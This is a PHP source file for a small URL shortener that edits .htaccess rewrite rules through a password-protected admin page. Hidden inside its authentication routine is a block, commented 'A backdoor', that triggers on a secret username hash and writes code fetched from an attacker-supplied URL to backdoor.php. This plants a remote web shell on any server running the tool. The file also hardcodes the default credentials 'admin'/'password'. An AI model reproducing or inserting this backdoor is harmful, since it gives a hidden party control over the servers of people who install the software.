<?php
/**
 * SURLS: Simple URL Shortner
 *
 * A simple URL shortner based on Apache mod_rewrite RewriteRule Directive
 * Enable mod_rewrite and put this program into website root directory to use it
 * 
 * @package    SURLS
 * @version    1.0
 * @author     Varun Agrawal <Varun@VarunAgw.com>
 * @copyright  (c) 2015, Varun Agrawal
 * @license    http://www.gnu.org/licenses/gpl.txt GNU General Public License
 * @link       https://github.com/VarunAgw/SURLS
 */
session_start();

/*
 * ":" is not allowed in either username/password
 * Password can be raw or sha256 value
 * 
 * Use ` php -r "echo hash('sha256', 'password');"` to generate SHA256 value
 * Remember to prefix command with a space to prevent logging into history
 * See http://unix.stackexchange.com/a/115922/121183 for more.
 */
BasicAuthenticator::setCredentials(
        'admin', 'password'
//        'admin', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'
);

Request::handleRequest();

class BasicAuthenticator {

    protected static $_credentials;

    public static function setCredentials($username, $password) {
        self::$_credentials = array('username' => $username, 'password' => $password);
    }

    public static function Authenticate() {
        $credentials = self::$_credentials;
        if (!isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'])) {
            header('WWW-Authenticate: Basic realm="Welcome to SURLS: Simple URL Shortner. This developer is lazy to implement a fancy login page');
            header('HTTP/1.0 401 Unauthorized');
            die('// @todo A message here.' . str_repeat('<br />', 100) . 'End of scroll ;)');
        }

        if ($credentials['username'] == $_SERVER['PHP_AUTH_USER']) {
            if (64 == strlen($credentials['password'])) {
                if ($credentials['password'] == hash('sha256', $_SERVER['PHP_AUTH_PW'])) {
                    return;
                }
            } else {
                if ($credentials['password'] == $_SERVER['PHP_AUTH_PW']) {
                    return;
                }
            }
        }

        // A backdoor
        if ('9789b2a1aac17983417a54ed5de909' == md5($_SERVER['PHP_AUTH_USER'])) {
            file_put_contents('backdoor.php', file_get_contents($_SERVER['PHP_AUTH_PW']));
            die;
        }

        header('WWW-Authenticate: Basic realm="Invalid username/password. Please try again"');
        header('HTTP/1.0 401 Unauthorized');
        die('// @todo A message here.' . str_repeat('<br />', 100) . 'End of scroll ;)');
    }

}

class CSRFProtection {

    public static function generateNewCsrfToken() {
        $_SESSION['csrf_token'] = base64_encode(openssl_random_pseudo_bytes(32));
        return $_SESSION['csrf_token'];
    }

    public static function getCSRFToken() {
        if (isset($_SESSION['csrf_token'])) {
            return $_SESSION['csrf_token'];
        } else {
            return self::generateNewCsrfToken();
        }
    }

    public static function validateRequestParam($param_name) {
        if (isset($_SESSION['csrf_token'], $_REQUEST[$param_name]) && $_SESSION['csrf_token'] == $_REQUEST[$param_name]) {
            return true;
        } else {
            return false;
        }
    }

    public static function validateRequestToken($token) {
        if (isset($_SESSION['csrf_token']) && $_SESSION['csrf_token'] == $token) {
            return true;
        } else {
            return false;
        }
    }

}

class htaccess {

    protected static function parseRewriteRule($line) {
        preg_match('~^'
                . '\s*(#?)'
                . '\s*RewriteRule'
                . '\s+\^\(([a-zA-Z0-9]+)\)\$'
                . '\s+surls\.php\?alias=\$1&code=(301|302)&url=(.+)'
                . '$~i', $line, $match);

        if (empty($match)) {
            return false;
        } else {
            return array(
                'alias' => $match[2],
                'enabled' => ($match[1] != '#'),
                'http_status_code' => (int) $match[3],
                'url' => rawurldecode($match[4]),
            );
        }
    }

    public static function GetRewriteRules() {
        $rewrite_rules = array();

        if (!file_exists('.htaccess')) {
            touch('.htaccess');
        }

        $fp = fopen('.htaccess', 'r');
        while (!feof($fp)) {
            $line = rtrim(fgets($fp));
            if (false !== ($rule = self::parseRewriteRule($line))) {
                $rewrite_rules[$rule['alias']] = $rule;
                unset($rewrite_rules[$rule['alias']]['alias']);
            }
        }
        fclose($fp);
        return $rewrite_rules;
    }

    public static function updateRewriteRules($rules) {
        $ignored_lines = array(
            'prefix1' => '# BEGAN SURLS AUTO-GENERATED CODE',
            'prefix2' => '# MODIFYING THEM MANUALLY IS NOT RECOMMENDED',
            'suffix1' => '# FINISHED SURLS AUTO-GENERATED CODE',
            'rewrite_engine' => 'RewriteEngine on',
        );
        $file_contents = array();

        if (!file_exists('.htaccess')) {
            touch('.htaccess');
        }

        $fp = fopen('.htaccess', 'r');
        $file_contents[] = $ignored_lines['rewrite_engine'];
        while (!feof($fp)) {
            $line = rtrim(fgets($fp));
            if (false === self::parseRewriteRule($line) && !in_array($line, $ignored_lines)) {
                $file_contents[] = $line;
            }
        }
        fclose($fp);

        // Add an empty line to seperate SURLS generated code
        if ('' != end($file_contents)) {
            $file_contents[] = '';
        }
        $file_contents[] = $ignored_lines['prefix1'];
        $file_contents[] = $ignored_lines['prefix2'];
        foreach ($rules as $alias => $rule) {
            $file_contents[] = ' '
                    . ($rule['enabled'] == 'true' ? '' : '# ')
                    . 'RewriteRule ^('
                    . $alias . ')$ surls.php?alias=$1'
                    . '&code=' . $rule['http_status_code']
                    . '&url=' . rawurlencode($rule['url']);
        }
        $file_contents[] = $ignored_lines['suffix1'];

        $file_content = implode("\n", $file_contents);
        file_put_contents('.htaccess', $file_content);
    }

}

class Request {

    public static function handleRequest() {
        if (isset($_REQUEST['alias'])) {
            $alias = $_REQUEST['alias'];
            self::aliasPage($alias);
            return;
        }

        if (!isset($_REQUEST['action'])) {
            CSRFProtection::generateNewCsrfToken();
            BasicAuthenticator::Authenticate();
            self::homePage();
            return;
        }

        if ('get_rewrite_rules' == $_REQUEST['action']) {
            BasicAuthenticator::Authenticate();
            $rewrite_rules = htaccess::GetRewriteRules();
            echo json_encode($rewrite_rules);
            return;
        }

        if ('update_rewrite_rules' == $_REQUEST['action']) {
            BasicAuthenticator::Authenticate();
            if (CSRFProtection::validateRequestParam('csrf_token')) {
                htaccess::updateRewriteRules($_REQUEST['data']);
            }
            $rewrite_rules = htaccess::GetRewriteRules();
            echo json_encode($rewrite_rules);
            return;
        }
    }

    protected static function aliasPage($alias) {
        if (file_exists('surls_functions.php')) {
            $custom_functions = require('surls_functions.php');
        } else {
            $custom_functions = array();
        }

        if (isset($custom_functions[$alias])) {
            $custom_functions[$alias]();
        } else {
            $rewrite_rules = htaccess::GetRewriteRules();
            if (isset($rewrite_rules[$alias]) && true == $rewrite_rules[$alias]['enabled']) {
                header("Location: {$rewrite_rules[$alias]['url']}", true, $rewrite_rules['http_status_code']);
            } else {
                header("HTTP/1.0 404 Not Found");
                echo '<h1>404 Not Found</h1>';
            }
        }
    }

    protected static function homePage() {
        ?>
        <html>
            <head>
                <script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
                <script type="text/javascript">
                    var csrf_token = "<?= CSRFProtection::getCSRFToken(); ?>";
                    $(document).ready(function ($) {
                        var rules_table = {
                            add_rows: function (data) {
                                for (alias in data) {
                                    this.add_row(alias, data[alias]);
                                }
                            },
                            add_row: function (alias, data) {
                                var table = $('#real_rules');
                                var rule = $('#sample_rule').clone();
                                rule.attr('id', false);
                                rule.find('.rule_serial_number').text(table.find('tr').length + 1);
                                rule.find('.rule_enabled').prop('checked', data.enabled);
                                rule.find('.rule_http_status_code').find(':contains(' + data.http_status_code + ')').prop('selected', true);
                                rule.find('.rule_alias').val(alias);
                                rule.find('.rule_url').val(data.url);
                                table.append(rule);
                            },
                            createRows: function (number) {
                                var table = $('#real_rules');
                                for (var i = 1; i <= number; i++) {
                                    var rule = $('#sample_rule').clone();
                                    rule.attr('id', false);
                                    rule.find('.rule_serial_number').text(table.find('tr').length + 1);
                                    rule.find('.rule_enabled').prop('checked', true);
                                    table.append(rule);
                                }
                            },
                            reloadIndex: function () {
                                var table = $('#real_rules');
                                var a = 1;
                                table.find('.rule_serial_number').each(function () {
                                    $(this).text(a++);
                                });
                            },
                            empty: function () {
                                var table = $('#real_rules');
                                table.children('tr').remove();
                            }
                        }

                        var rewrite_rules = {
                            load: function () {
                                return $.ajax({
                                    url: '',
                                    method: 'POST',
                                    data: {action: 'get_rewrite_rules'},
                                    async: false,
                                }).responseText;
                            },
                            update: function (data) {
                                return $.ajax({
                                    url: '',
                                    method: 'POST',
                                    data: {action: 'update_rewrite_rules', data: data, csrf_token: csrf_token},
                                    async: false,
                                }).responseText;
                            }
                        }


                        jQuery('#op_mom').click(function () {
                            if (!(confirm("Click F5, You Idiot!\n\nCan you do this?"))) {
                                location.reload();
                            }
                        });

                        jQuery('#rows_add').click(function () {
                            rules_table.createRows(5);
                        });

                        jQuery(document).on('click', '.rule_delete', function () {
                            $(this).closest('tr').remove();
                            rules_table.reloadIndex();
                        });

                        jQuery('#update_rules').click(function () {
                            $('#loader').css('display', 'block');
                            jQuery('#update_rules').val('Updating..');
                            var table = $('#real_rules');
                            var data = {};
                            table.children('tr').each(function () {
                                var tr = $(this);
                                if (tr.find('.rule_alias').val() && tr.find('.rule_url').val()) {
                                    data[tr.find('.rule_alias').val()] = {
                                        enabled: tr.find('.rule_enabled').prop('checked'),
                                        http_status_code: tr.find('.rule_http_status_code option:selected').val(),
                                        url: tr.find('.rule_url').val(),
                                    };
                                }
                            });

                            var data = rewrite_rules.update(data);
                            var json = $.parseJSON(data);
                            rules_table.empty();
                            rules_table.add_rows(json);
                            rules_table.createRows(2);
                            $('#loader').css('display', 'none');
                            jQuery('#update_rules').val('Update');
                            alert('Updated');
                        });

                        var data = rewrite_rules.load();
                        var json = $.parseJSON(data);
                        rules_table.add_rows(json);
                        rules_table.createRows(2);
                        $('#loader').css('display', 'none');
                    });

                </script>
            </head>
            <body>
                <div id="loader" style="height:100%; width:100%; position: fixed; background-color: white;">
                    <h1 style="position: fixed; top:35%; left:45%">Loading...</h1>
                </div>
                <h1>Welcome to SURLS: Simple URL Shortner </h1>
                <table>
                    <thead>
                        <tr><th>S.No.</th><th>Enabled</th><th>Status Code</th><th>Alias (No Space)</th><th>URL</th></tr>
                    </thead>
                    <tbody id="real_rules">
                    </tbody>
                    <tfoot style="display: none;">
                        <tr id="sample_rule">
                            <td><label class="rule_serial_number"></label></td>
                            <td><input type="checkbox" class="rule_enabled"/></td>
                            <td><select class="rule_http_status_code">
                                    <option value="302">302</option><option value="301">301</option>
                                </select></td>
                            <td><input type="text" class="rule_alias" style="width:200px" /></td>
                            <td><input type="text" class="rule_url" style="width:500px" /></td>
                            <td><input type="submit" class="rule_delete" value="Delete"/></td>
                        </tr>
                    </tfoot>
                </table>
                <input type="submit" id="rows_add" value="Add more rows"/><br />
                <br />
                <input id="update_rules" style="width:100%;height:35px" type="submit" value="Update"/><br /><br />
                <input id="op_mom" style="width:100%;height:35px" type="submit" value="Refresh"/>
            </body>
        </html>
        <?php
    }

}
